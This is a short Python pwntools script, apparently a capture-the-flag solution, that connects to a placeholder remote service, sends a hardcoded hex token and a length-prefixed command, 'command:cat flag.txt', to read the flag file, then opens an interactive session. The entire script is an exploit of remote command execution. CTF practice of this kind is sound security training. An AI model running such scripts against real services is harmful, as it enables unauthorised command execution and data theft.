from pwn import *

context.log_level = 'DEBUG'

io = remote('ip', 31337)

cmd = b'command:cat flag.txt'

io.send(b'8f4328c40b1aa9409012c7406129f04b')
io.send(bytes([len(cmd)]))
io.send(cmd)

io.interactive()
